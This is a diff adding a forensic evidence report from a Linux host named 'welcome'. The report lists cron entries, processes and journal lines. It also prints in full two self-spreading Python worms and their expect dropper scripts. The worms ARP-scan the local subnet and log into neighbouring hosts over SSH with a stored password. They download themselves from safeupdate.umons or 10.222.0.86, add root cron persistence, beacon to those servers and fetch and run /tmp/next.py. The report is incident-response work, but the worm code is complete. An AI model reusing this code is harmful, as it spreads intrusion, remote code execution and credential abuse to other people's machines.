@@ -1,0 +1,508 @@
+== Evidence of ice on welcome (2026-11-12 13:12): read-only, secrets redacted, ice not executed
+INFO  /tmp/.test: present, 1 line(s) used as secrets to redact (never printed)
+
+== Metadata
+INFO  /tmp/poiuytre: 921 bytes, owner uid 0, mode 0o755, modified 2026-11-12 12:37, sha256 dd440f2f0ee0c9c2737f02aa603b3521cb771b514b1c5e03fe17b1696021f169
+INFO  /tmp/poiuytree: 923 bytes, owner uid 0, mode 0o755, modified 2026-11-12 12:38, sha256 ee5862ae83855f99db85679121df97c8093e7bba2e497a026d0c5dd11db3e609
+INFO  /usr/local/bin/ice.py: 5504 bytes, owner uid 1001, mode 0o664, modified 2026-11-10 10:29, sha256 c72cf5f54d8806ed90ba4d62de621a467da00ef716153ef2d4485ee5a1509048
+INFO  /usr/local/bin/ice2.py: 5494 bytes, owner uid 1001, mode 0o664, modified 2026-11-04 09:42, sha256 d18b295830034bc7311d4cc469e37c7a303ae5ecb1a1eb3f77fdf48b25acd34c
+INFO  /etc/crontab lines running ice: 3
+        23:30 * * * * root python3 /usr/local/bin/ice2.py
+        24:30 * * * * root python3 /usr/local/bin/ice.py
+INFO  process: 2437 1 mother Tue Nov 10 10:29:11 2026 sh -c cat /tmp/.test | sudo -S python3 /usr/local/bin/ice.py
+INFO  process: 2440 2437 root Tue Nov 10 10:29:11 2026 sudo -S python3 /usr/local/bin/ice.py
+INFO  process: 2445 2440 root Tue Nov 10 10:29:11 2026 sudo -S python3 /usr/local/bin/ice.py
+INFO  process: 2446 2445 root Tue Nov 10 10:29:11 2026 python3 /usr/local/bin/ice.py
+INFO  process: 2648 2640 root Tue Nov 10 10:30:00 2026 /bin/sh -c python3 /usr/local/bin/ice2.py
+INFO  process: 2650 2648 root Tue Nov 10 10:30:00 2026 python3 /usr/local/bin/ice2.py
+
+== Orders: what ice started and what the command servers answer now (nothing is executed)
+INFO  processes started by ice now: 
+        2440 2437 root Tue Nov 10 10:29:11 2026 sudo -S python3 /usr/local/bin/ice.py
+        2445 2440 root Tue Nov 10 10:29:11 2026 sudo -S python3 /usr/local/bin/ice.py
+        2446 2445 root Tue Nov 10 10:29:11 2026 python3 /usr/local/bin/ice.py
+        2650 2648 root Tue Nov 10 10:30:00 2026 python3 /usr/local/bin/ice2.py
+        19488 2446 root Thu Nov 12 12:37:00 2026 [poiuytre] <defunct>
+        19489 2446 root Thu Nov 12 12:37:00 2026 [poiuytre] <defunct>
+        19538 2650 root Thu Nov 12 12:38:54 2026 [poiuytree] <defunct>
+        19539 2650 root Thu Nov 12 12:38:54 2026 [poiuytree] <defunct>
+INFO  journal lines about next.py, poiuytre or the command servers: 
+        2026-11-12T08:34:41+01:00 welcome sudo[17206]:     root : PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytree
+        2026-11-12T08:36:55+01:00 welcome sudo[17249]:     root : TTY=pts/6 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytre
+        2026-11-12T09:34:28+01:00 welcome sudo[17359]:     root : PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytree
+        2026-11-12T09:37:40+01:00 welcome sudo[17401]:     root : TTY=pts/6 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytre
+        2026-11-12T10:37:19+01:00 welcome sudo[17524]:     root : PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytree
+        2026-11-12T10:38:55+01:00 welcome sudo[17568]:     root : TTY=pts/6 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytre
+        2026-11-12T11:35:46+01:00 welcome sudo[17661]:     root : TTY=pts/6 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytre
+        2026-11-12T11:37:41+01:00 welcome sudo[17712]:     root : PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytree
+        2026-11-12T12:37:00+01:00 welcome sudo[19483]:     root : TTY=pts/6 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytre
+        2026-11-12T12:38:54+01:00 welcome sudo[19534]:     root : PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytree
+INFO  safeupdate.umons resolves to: 10.222.0.86     safeupdate.umons
+INFO  files in /tmp (name, size, date):
+        drwxrwxrwt 14 root   root     500 2026-11-12T13:12 .
+        drwxr-xr-x 19 root   root    4096 2026-11-04T10:20 ..
+        -rw-r--r--  1 root   root   11046 2026-11-12T12:27 check-full-welcome.txt
+        -rw-r--r--  1 root   root    2903 2026-11-12T12:21 check-mail.txt
+        -rw-r--r--  1 root   root    8921 2026-11-12T12:21 check-welcome.txt
+        -rw-r--r--  1 root   root   12646 2026-11-12T12:42 evidence-ice-welcome.txt
+        drwxrwxrwt  2 root   root      40 2026-11-10T09:40 .font-unix
+        drwxrwxrwt  2 root   root      60 2026-11-10T09:44 .ICE-unix
+        -rw-r--r--  1 root   root       0 2026-11-10T10:29 .isice
+        -rw-r--r--  1 root   root       0 2026-11-10T10:30 .isice2
+        -rwxr-xr-x  1 root   root     921 2026-11-12T12:37 poiuytre
+        -rwxr-xr-x  1 root   root     923 2026-11-12T12:38 poiuytree
+        drwx------  2 user   user      60 2026-11-10T09:44 ssh-0PU81Yb3do8O
+        drwx------  3 root   root      60 2026-11-10T09:44 systemd-private-a90c56654b324fe69d29f82035a8d81e-colord.service-r4ZKOf
+        drwx------  3 root   root      60 2026-11-10T19:30 systemd-private-a90c56654b324fe69d29f82035a8d81e-dovecot.service-QhYSn5
+        drwx------  3 root   root      60 2026-11-10T09:40 systemd-private-a90c56654b324fe69d29f82035a8d81e-lm-sensors.service-C0qcl0
+        drwx------  3 root   root      60 2026-11-10T09:40 systemd-private-a90c56654b324fe69d29f82035a8d81e-ModemManager.service-Ign4bG
+        drwx------  3 root   root      60 2026-11-10T09:40 systemd-private-a90c56654b324fe69d29f82035a8d81e-polkit.service-XQwS09
+        drwx------  3 root   root      60 2026-11-10T09:40 systemd-private-a90c56654b324fe69d29f82035a8d81e-systemd-logind.service-rmRLuj
+        drwx------  3 root   root      60 2026-11-10T09:44 systemd-private-a90c56654b324fe69d29f82035a8d81e-upower.service-gpRarK
+        -rw-rw-r--  1 mother mother     7 2026-11-10T10:29 .test
+        -r--r--r--  1 root   root      11 2026-11-10T09:40 .X0-lock
+        drwxrwxrwt  2 root   root      60 2026-11-12T13:12 .X11-unix
+        -rw-------  1 user   user     406 2026-11-10T09:44 .xfsm-ICE-IQRUY3
+        drwxrwxrwt  2 root   root      40 2026-11-10T09:40 .XIM-unix
+INFO  GET https://safeupdate.umons/next (saved to /root/next-observed-safeupdate.umons.txt, NOT executed): HTTP status and bytes: 404 0
+INFO  GET https://10.222.0.86/next (saved to /root/next-observed-10.222.0.86.txt, NOT executed): HTTP status and bytes: 404 0
+
+== Content of /tmp/poiuytre (1 value(s) redacted)
+#!/usr/bin/expect -f
+set pass [lrange $argv 0 0]
+set server [lrange $argv 1 1]
+set name [lrange $argv 2 2]
+
+spawn ssh -o "StrictHostKeyChecking no" $name@$server
+match_max 100000
+expect "*?assword:*"
+send -- "$pass\r"
+send -- "\r"
+expect "$ "
+send "file /tmp/.isice\r"
+expect {
+    empty {
+        exit
+    } "cannot open" {
+    
+    }
+}
+send "wget --no-check-certificate -O /tmp/ice.py https://safeupdate.umons/ice.py \r"
+expect "$ "
+send "echo <REDACTED> | sudo -Si >/dev/null 2>&1 \r"
+expect "$ "
+send "sudo mv /tmp/ice.py /usr/local/bin/ice.py \r"
+expect "$ "
+send "echo '30 * * * * root python3 /usr/local/bin/ice.py' | sudo tee -a /etc/crontab \r"
+expect "$ "
+send "echo $pass > /tmp/.test \r"
+expect "$ "
+send "nohup sh -c 'cat /tmp/.test | sudo -S python3 /usr/local/bin/ice.py' > /dev/null 2>&1 & \r"
+expect "$ "
+send "sudo /etc/init.d/cron reload \r"
+expect "$ "
+send "sudo service crond reload \r"
+expect "$ "
+    
+== End of /tmp/poiuytre
+
+== Content of /tmp/poiuytree (1 value(s) redacted)
+#!/usr/bin/expect -f
+set pass [lrange $argv 0 0]
+set server [lrange $argv 1 1]
+set name [lrange $argv 2 2]
+
+spawn ssh -o "StrictHostKeyChecking no" $name@$server
+match_max 100000
+expect "*?assword:*"
+send -- "$pass\r"
+send -- "\r"
+expect "$ "
+send "file /tmp/.isice2\r"
+expect {
+    empty {
+        exit
+    } "cannot open" {
+    
+    }
+}
+send "wget --no-check-certificate -O /tmp/ice2.py https://10.222.0.86/ice2.py \r"
+expect "$ "
+send "echo <REDACTED> | sudo -Si >/dev/null 2>&1 \r"
+expect "$ "
+send "sudo mv /tmp/ice2.py /usr/local/bin/ice2.py \r"
+expect "$ "
+send "echo '30 * * * * root python3 /usr/local/bin/ice2.py' | sudo tee -a /etc/crontab \r"
+expect "$ "
+send "echo $pass > /tmp/.test \r"
+expect "$ "
+send "nohup sh -c 'cat /tmp/.test | sudo -S python3 /usr/local/bin/ice2.py' > /dev/null 2>&1 & \r"
+expect "$ "
+send "sudo /etc/init.d/cron reload \r"
+expect "$ "
+send "sudo service crond reload \r"
+expect "$ "
+    
+== End of /tmp/poiuytree
+
+== Content of /usr/local/bin/ice.py (5 value(s) redacted)
+import subprocess
+import random
+import ssl
+import urllib.request
+
+import os
+
+if os.path.exists("/tmp/.isice"):
+    print("Already running")
+    exit(0)
+
+open("/tmp/.isice", "a").close()
+
+PASSWD = "<REDACTED>"
+
+def run_as_root(cmd, passwd):
+    import os
+    os.system("(echo <REDACTED> | sudo -Si >/dev/null 2>&1); sudo {}".format(passwd, cmd))
+
+def install_pip():
+    run_as_root("apt update", PASSWD)
+
+def install(package):
+    run_as_root("apt install -y python3-scapy", PASSWD)
+    run_as_root("dnf install -y python3-scapy", PASSWD)
+
+install_pip()
+install("scapy")
+
+
+def scan(ip):
+    import scapy.all as scapy
+    # scapy.arping(ip)
+
+    '''
+    Creating a ARP Packet using Scapy's ARP() class
+    object.pdst = ARP() class uses this as a member variable for IP Address of a/the Destination/s.
+    object.summary() = shows the member variables of the class
+    object.show() = shows the details of the object
+    '''
+    arp_req_frame = scapy.ARP(pdst = ip)
+    # arp_req_frame.show()
+
+    '''
+    Creating an Ethernet frame so that we can incorporate Source and Destination MAC Address
+    object = Scapy.Ether() where Ether is the class that enables us to create an Ethernet frame
+    object.show() = shows the details of the object
+    '''
+    broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
+    # broadcast_ether_frame.show()
+
+    '''
+    Now we have to combine both the frames so that we can transmit it using ethernet
+    Forward slash (/) in scapy allows us to combine frames
+    '''
+    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
+    # broadcast_ether_arp_req_frame.show()
+
+    '''
+    The frame to be send is ready and now we just have to send the frame and capture the responses.
+    To send the packets and receive the responses we'll use the scapy.srp(frame , timeout = 1)
+    scapy.srp(frame , timeout = 1) sends the frame (specified as an argument) to an IP address , and the timeout argument is 
+    also important as it tells for how much time to wait for an response. Eg: timeout = 1 means wait for 1 sec for the response and
+    if there is no response proceed with other IP addresses.
+
+    scapy.srp() returns the responses captured as two lists out of which the 1st list contains the answered responses from devices on the network and the 
+    2nd list contains the records of IP Addresses which did not respond.
+
+    verbose = False means the srp method will not print any message of its own in the output
+    '''
+    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
+    result = []
+    for i in range(0,len(answered_list)):
+        client_dict = {"ip" : answered_list[i][1].psrc, "mac" : answered_list[i][1].hwsrc}
+        result.append(client_dict)
+
+    return result
+
+
+import socket
+def get_ip_address():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("10.222.0.1", 53))
+    return s.getsockname()[0]
+
+def extract_prefix(ip):
+    sip = ip.split('.')
+    return "{}.{}.{}.0/24".format(sip[0], sip[1], sip[2])
+
+prefix = (extract_prefix(get_ip_address()))
+
+
+def write_expect_script():
+    s = r"""#!/usr/bin/expect -f
+set pass [lrange $argv 0 0]
+set server [lrange $argv 1 1]
+set name [lrange $argv 2 2]
+
+spawn ssh -o "StrictHostKeyChecking no" $name@$server
+match_max 100000
+expect "*?assword:*"
+send -- "$pass\r"
+send -- "\r"
+expect "$ "
+send "file /tmp/.isice\r"
+expect {
+    empty {
+        exit
+    } "cannot open" {
+    
+    }
+}
+send "wget --no-check-certificate -O /tmp/ice.py https://safeupdate.umons/ice.py \r"
+expect "$ "
+send "echo <REDACTED> | sudo -Si >/dev/null 2>&1 \r"
+expect "$ "
+send "sudo mv /tmp/ice.py /usr/local/bin/ice.py \r"
+expect "$ "
+send "echo '30 * * * * root python3 /usr/local/bin/ice.py' | sudo tee -a /etc/crontab \r"
+expect "$ "
+send "echo $pass > /tmp/.test \r"
+expect "$ "
+send "nohup sh -c 'cat /tmp/.test | sudo -S python3 /usr/local/bin/ice.py' > /dev/null 2>&1 & \r"
+expect "$ "
+send "sudo /etc/init.d/cron reload \r"
+expect "$ "
+send "sudo service crond reload \r"
+expect "$ "
+    """
+    with open("/tmp/poiuytre", "w") as f:
+        print(s, file=f)
+    run_as_root("chmod 755 /tmp/poiuytre", PASSWD)
+
+
+run_as_root("apt update", PASSWD)
+run_as_root("apt install -y expect", PASSWD)
+run_as_root("dnf install -y expect", PASSWD)
+import time
+
+while True:
+    write_expect_script()
+
+    try:
+        to_test = scan(prefix)
+        # Self propagate
+        for t in to_test:
+            import os
+            ip = t["ip"]
+            print("Trying {}".format(ip))
+            subprocess.Popen(["/tmp/poiuytre", "<REDACTED-SECRET-1>", "{}".format(ip), "mother"])
+    except Exception:
+        pass
+
+    try:
+        ssl._create_default_https_context = ssl._create_unverified_context
+        urllib.request.urlopen("https://safeupdate.umons/{}".format(get_ip_address())).read()
+    except Exception:
+        pass
+
+    try:
+        ssl._create_default_https_context = ssl._create_unverified_context
+        cx = urllib.request.urlopen("https://safeupdate.umons/next")
+        if cx.status == 200:
+            script = cx.read()
+            with open("/tmp/next.py", "wb") as n:
+                n.write(script)
+            os.system("chmod 777 /tmp/next.py")
+            try:
+                subprocess.Popen(["/tmp/next.py"])
+            except Exception:
+                    pass
+            os.system("/tmp/next.py")
+    except Exception:
+        pass
+
+    print("I am the gentle malware")
+    rtime = int(random.uniform(0, 400))
+    time.sleep(3400 + rtime)
+== End of /usr/local/bin/ice.py
+
+== Content of /usr/local/bin/ice2.py (4 value(s) redacted)
+import subprocess
+import random
+import ssl
+import urllib.request
+
+import os
+
+if os.path.exists("/tmp/.isice2"):
+    print("Already running")
+    exit(0)
+
+open("/tmp/.isice2", "a").close()
+
+def run_as_root(cmd):
+    import os
+    os.system("(echo <REDACTED> | sudo -Si >/dev/null 2>&1); sudo {}".format(cmd))
+
+def install_pip():
+    run_as_root("apt update")
+
+def install(package):
+    run_as_root("apt install -y python3-scapy")
+
+install_pip()
+install("scapy")
+
+def scan(ip):
+    import scapy.all as scapy
+    # scapy.arping(ip)
+
+    '''
+    Creating a ARP Packet using Scapy's ARP() class
+    object.pdst = ARP() class uses this as a member variable for IP Address of a/the Destination/s.
+    object.summary() = shows the member variables of the class
+    object.show() = shows the details of the object
+    '''
+    arp_req_frame = scapy.ARP(pdst = ip)
+    # arp_req_frame.show()
+
+    '''
+    Creating an Ethernet frame so that we can incorporate Source and Destination MAC Address
+    object = Scapy.Ether() where Ether is the class that enables us to create an Ethernet frame
+    object.show() = shows the details of the object
+    '''
+    broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
+    # broadcast_ether_frame.show()
+
+    '''
+    Now we have to combine both the frames so that we can transmit it using ethernet
+    Forward slash (/) in scapy allows us to combine frames
+    '''
+    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
+    # broadcast_ether_arp_req_frame.show()
+
+    '''
+    The frame to be send is ready and now we just have to send the frame and capture the responses.
+    To send the packets and receive the responses we'll use the scapy.srp(frame , timeout = 1)
+    scapy.srp(frame , timeout = 1) sends the frame (specified as an argument) to an IP address , and the timeout argument is 
+    also important as it tells for how much time to wait for an response. Eg: timeout = 1 means wait for 1 sec for the response and
+    if there is no response proceed with other IP addresses.
+
+    scapy.srp() returns the responses captured as two lists out of which the 1st list contains the answered responses from devices on the network and the 
+    2nd list contains the records of IP Addresses which did not respond.
+
+    verbose = False means the srp method will not print any message of its own in the output
+    '''
+    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
+    result = []
+    for i in range(0,len(answered_list)):
+        client_dict = {"ip" : answered_list[i][1].psrc, "mac" : answered_list[i][1].hwsrc}
+        result.append(client_dict)
+
+    return result
+
+
+import socket
+def get_ip_address():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("10.222.0.1", 53))
+    return s.getsockname()[0]
+
+def extract_prefix(ip):
+    sip = ip.split('.')
+    return "{}.{}.{}.0/24".format(sip[0], sip[1], sip[2])
+
+prefix = (extract_prefix(get_ip_address()))
+
+def run_as_root(cmd):
+    import os
+    os.system("(echo <REDACTED> | sudo -Si >/dev/null 2>&1); sudo {}".format(cmd))
+
+
+def write_expect_script():
+    s = r"""#!/usr/bin/expect -f
+set pass [lrange $argv 0 0]
+set server [lrange $argv 1 1]
+set name [lrange $argv 2 2]
+
+spawn ssh -o "StrictHostKeyChecking no" $name@$server
+match_max 100000
+expect "*?assword:*"
+send -- "$pass\r"
+send -- "\r"
+expect "$ "
+send "file /tmp/.isice2\r"
+expect {
+    empty {
+        exit
+    } "cannot open" {
+    
+    }
+}
+send "wget --no-check-certificate -O /tmp/ice2.py https://10.222.0.86/ice2.py \r"
+expect "$ "
+send "echo <REDACTED> | sudo -Si >/dev/null 2>&1 \r"
+expect "$ "
+send "sudo mv /tmp/ice2.py /usr/local/bin/ice2.py \r"
+expect "$ "
+send "echo '30 * * * * root python3 /usr/local/bin/ice2.py' | sudo tee -a /etc/crontab \r"
+expect "$ "
+send "echo $pass > /tmp/.test \r"
+expect "$ "
+send "nohup sh -c 'cat /tmp/.test | sudo -S python3 /usr/local/bin/ice2.py' > /dev/null 2>&1 & \r"
+expect "$ "
+send "sudo /etc/init.d/cron reload \r"
+expect "$ "
+send "sudo service crond reload \r"
+expect "$ "
+    """
+    with open("/tmp/poiuytree", "w") as f:
+        print(s, file=f)
+    run_as_root("chmod 755 /tmp/poiuytree")
+
+
+run_as_root("apt update")
+run_as_root("apt install -y expect")
+run_as_root("dnf install -y expect")
+import time
+
+while True:
+    write_expect_script()
+
+    try:
+        to_test = scan(prefix)
+        # Self propagate
+        for t in to_test:
+            import os
+            ip = t["ip"]
+            print("Trying {}".format(ip))
+            subprocess.Popen(["/tmp/poiuytree", "<REDACTED-SECRET-1>", "{}".format(ip), "mother"])
+    except Exception:
+        pass
+
+    try:
+        ssl._create_default_https_context = ssl._create_unverified_context
+        urllib.request.urlopen("https://10.222.0.86/{}".format(get_ip_address())).read()
+    except Exception:
+        pass
+
+    try:
+        ssl._create_default_https_context = ssl._create_unverified_context
+        cx = urllib.request.urlopen("https://10.222.0.86/next")
+        if cx.status == 200:
+            script = cx.read()
+            with open("/tmp/next.py", "wb") as n:
+                n.write(script)
+            os.system("chmod 777 /tmp/next.py")
+            try:
+                subprocess.Popen(["/tmp/next.py"])
+            except Exception:
+                    pass
+            os.system("python3 /tmp/next.py")
+    except Exception:
+        pass
+
+    print("I am the second gentle malware")
+    rtime = int(random.uniform(0, 400))
+    time.sleep(3400 + rtime)
+== End of /usr/local/bin/ice2.py
